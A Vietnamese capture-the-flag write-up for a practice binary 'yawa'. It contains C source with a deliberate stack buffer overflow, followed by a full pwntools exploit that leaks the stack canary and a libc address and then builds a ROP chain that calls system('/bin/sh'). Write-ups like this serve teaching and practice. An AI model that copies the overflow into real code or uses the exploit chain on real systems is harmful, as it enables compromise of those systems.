## General
```sh
$ checksec yawa
[*] '/home/alter/pwn/Practice/yawa/yawa'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
alter ^ Sol in ~/pwn/Practice/yawa [fg: 1]
$ file yawa
yawa: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7f7b72aaab967245353b6816808804a6c4ad2168, not stripped
```
Chúng ta có thể thấy `binary` này có full bảo vệ. Vì thế đây có thể là một challenge khó khăn :v

## Analysis

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void init() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
}

int menu() {
    int choice;
    puts("1. Tell me your name");
    puts("2. Get a personalised greeting");
    printf("> ");
    scanf("%d", &choice);
    return choice;
}

int main() {
    init();

    char name[88];
    int choice;

    while(1) {
        choice = menu();
        if(choice == 1) {
            read(0, name, 0x88);
        } else if(choice == 2) {
            printf("Hello, %s\n", name);
        } else {
            break;
        }
    }
}
```

Source code khá đơn giản, chỉ là nhập `choice` và chuyển sang các chức năng. Đặc biệt chú ý khi ta nhập `choice == 1` ta có thể thấy ở đây xảy ra lỗi `buffer overflow` vì hàm `read` có thể đọc đến `0x88` bytes trong khi biến `name` chỉ chứa được `88` bytes.

## Exploit

Dùng gdb ta có thể tìm được offset giữa input và `saved rip` là `0x68` bytes. Nhưng binary này có `Stack Canary`, nó sẽ thoát chương trình vô điều kiện nếu giá trị của nó bị thay đổi, vì thế ta cần leak giá trị này ra để kèm nó vào `payload` trước `saved rbp`. Ta có thể để ý hàm `read()` đọc kí tự mà không thêm NULL byte vào cuối chuỗi, điều này sẽ làm chiều ta nhập vào nối với chuỗi khác, từ đó ta có thể tận dụng điều này để leak được `canary`:

```py
# [1] Leak canary
buf2cnry = b'A' * 0x59

sla(b'> ', b'1')
s(buf2cnry)
sla(b'> ', b'2')
ru(buf2cnry)
cnry = u64(b'\x00' + rnb(7))
slog('Canary', cnry)
```

Sau khi có được `canary` rồi ta có thể tiếp tục đến việc leak `libc` nhưng vì binary này `Full RELRO` nên việc leak libc bằng GOT hay PLT là điều khá khó khăn hoặc dường như là không thể. Nên ta có thể nghĩ đến việc dùng kĩ thuật `__libc_start_main return`. Thì nói ngắn gọn thì `__libc_start_main` sẽ khởi tạo tiến trình, gọi hàm `main` với các đối số thích hợp và xử lý giá trị trả về từ hàm `main`. Nếu ta để ý thấy, thì mỗi lần ta chạy chương trình và chương trình return một cách bình thường, không có sự can thiệp của chúng ta thông qua `overflow` hay những thứ khác thì nó sẽ return về `__libc_start_main+offset` với mục đích là để thoát chưa trình. Thì vì lý do `__libc_start_main` thuộc `libc` nên khi ta leak được libc, ta có thể dễ dàng tính được địa chỉ base của nó:

```py
# [2] Leak libc

pl1 = b'B' * 0x58 + b'C' * 0x8 + b'D' * 0x8
sla(b'> ', b'1')
s(pl1)
sla(b'> ', b'2')
ru(pl1)
libc_start_main = u64(rnb(6) + b'\x00\x00')
libc.address = libc_start_main - 0x1d90 - 0x28000
slog('libc_start_main', libc_start_main)
slog('libc base',libc.address)
slog('system', libc.sym.system)
slog('/bin/sh',next(libc.search(b'/bin/sh')))
```

```py
libc.address = libc_start_main - 0x1d90 - 0x28000
```

Ở chỗ này ta có thể check bằng cách sử dụng `vmmap <leaked_address>` rồi xem `offset` của nó là bao nhiêu từ đó ta trừ ra

```sh
pwndbg> vmmap 0x7ffff7dbbd90
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7d92000     0x7ffff7dba000 r--p    28000      0 /home/alter/pwn/Practice/yawa/libc.so.6
►   0x7ffff7dba000     0x7ffff7f4f000 r-xp   195000  28000 /home/alter/pwn/Practice/yawa/libc.so.6 +0x1d90
    0x7ffff7f4f000     0x7ffff7fa7000 r--p    58000 1bd000 /home/alter/pwn/Practice/yawa/libc.so.6
```

Lý do mà ta sử dụng được technique này một phần là do khi return về thì hàm main chỉ return về một địa chỉ nhất định, nên từ đó offset mà ta tính ra nó không thay đổi vì thế sẽ giúp ta tính `libc base` không bị sai

Và sau khi có những thứ mình cần hết rồi thì ta có thể get shell bằng hàm `system` nhưng điều đáng chú ý ở đây là ở binary không cho ta dùng `pop rdi; ret` một cách thoải mái (tại vì nó không có). Nên ta có thể sử dụng các `gadget` có trong libc. Một lưu ý nữa rằng `PIE` đang bật nên các address hiện ra chỉ là offset của nó đến `base address`. Vì đây là gadget trong `libc` nên sẽ dễ hiểu đó là offset được tính từ `libc base` mà chúng ta đã leak:

```py
# [3] Get shell

pop_rdi = 0x000000000002a3e5
ret = 0x0000000000029139

pl2 = b'A' * 0x58 + p64(cnry) + b'B' * 0x8
pl2 += p64(ret + libc.address)
pl2 += p64(pop_rdi + libc.address) + p64(next(libc.search(b'/bin/sh')))
pl2 += p64(libc.sym.system)
sla(b'> ',b'1')
s(pl2)
sla(b'> ',b'3')
```

## Full exploit

```py
#!/usr/bin/python3
from pwncus import *

# context.log_level = 'debug'
exe = context.binary = ELF('./yawa_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''


b*main+142
c
''') if not args.REMOTE else None

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

# [1] Leak canary
buf2cnry = b'A' * 0x59

sla(b'> ', b'1')
s(buf2cnry)
sla(b'> ', b'2')
ru(buf2cnry)
cnry = u64(b'\x00' + rnb(7))
slog('Canary', cnry)

# [2] Leak libc

pl1 = b'B' * 0x58 + b'C' * 0x8 + b'D' * 0x8
sla(b'> ', b'1')
s(pl1)
sla(b'> ', b'2')
ru(pl1)
libc_start_main = u64(rnb(6) + b'\x00\x00')
libc.address = libc_start_main - 0x1d90 - 0x28000
slog('libc_start_main', libc_start_main)
slog('libc base',libc.address)
slog('system', libc.sym.system)
slog('/bin/sh',next(libc.search(b'/bin/sh')))

# [3] Get shell

pop_rdi = 0x000000000002a3e5
ret = 0x0000000000029139

pl2 = b'A' * 0x58 + p64(cnry) + b'B' * 0x8
pl2 += p64(ret + libc.address)
pl2 += p64(pop_rdi + libc.address) + p64(next(libc.search(b'/bin/sh')))
pl2 += p64(libc.sym.system)
sla(b'> ',b'1')
s(pl2)
sla(b'> ',b'3')

interactive()
```
